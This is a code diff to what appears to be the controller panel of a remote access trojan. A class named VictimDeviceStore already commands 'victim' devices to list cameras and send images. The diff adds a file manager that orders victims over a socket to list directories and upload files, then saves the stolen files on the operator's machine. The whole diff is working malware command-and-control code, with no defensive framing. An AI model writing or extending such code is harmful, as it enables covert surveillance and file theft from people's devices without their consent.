@@ -1,3 +1,4 @@
+import { saveAs } from 'file-saver';
 import { action, makeObservable, observable } from 'mobx';
 import { io, type Socket } from 'socket.io-client';
 
@@ -11,6 +12,7 @@ import {
 import {
     type CameraItem,
     type CameraOrderPayload,
+    type FileListItem,
     type IBaseEntity,
     type IServerToVictimEvents,
     type IVictim,
@@ -40,6 +42,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
     public open: boolean = false;
     public cameras: CameraItem[] = [];
     public imageDataUrl: string | null = null;
+    public files: FileListItem[] = [];
 
     public constructor(input: IBaseEntity & IVictim) {
         this.id = input.id;
@@ -68,8 +71,10 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
             cameras: observable,
             connectionStatus: observable,
             imageDataUrl: observable,
+            files: observable,
             open: observable,
             setCameras: action,
+            setFiles: action,
             setImage: action,
             setOpen: action,
             setConnectionStatus: action,
@@ -131,6 +136,27 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
                 this.setImage(Buffer.from(data.buffer));
             }
         });
+
+        this.socket.on(VictimOrder.FILE_MANAGER, (data) => {
+            if (Array.isArray(data)) {
+                if (data.length === 0) {
+                    console.error(`Permission denied for listing files!`);
+                    // TODO: Show toast
+                } else {
+                    console.log(
+                        `[VICTIM] Listing files from ${this.deviceId}`,
+                        data,
+                    );
+                    this.setFiles(data);
+                }
+            } else if (data.file) {
+                console.log(
+                    `[VICTIM] Downloading file from ${this.deviceId}`,
+                    data,
+                );
+                saveAs(new Blob([Buffer.from(data.buffer)]), data.name);
+            }
+        });
     }
 
     public listCameras(): void {
@@ -147,12 +173,36 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
         });
     }
 
+    public listFiles(path: string): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.FILE_MANAGER,
+            extra: 'ls',
+            path,
+        });
+    }
+
+    public downloadFile(path: string): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.FILE_MANAGER,
+            extra: 'dl',
+            path,
+        });
+    }
+
     public setCameras(cameras: CameraItem[]): void {
         this.cameras = cameras;
     }
 
     public setConnectionStatus(connectionStatus: ConnectionStatus): void {
         this.connectionStatus = connectionStatus;
+    }
+
+    public setFiles(files: FileListItem[]): void {
+        this.files = files
+            .sort((a, b) => a.name.localeCompare(b.name))
+            .sort((a, b) =>
+                a.isDir && !b.isDir ? -1 : b.isDir && !a.isDir ? 1 : 0,
+            );
     }
 
     public setImage(image: Buffer | null): void {
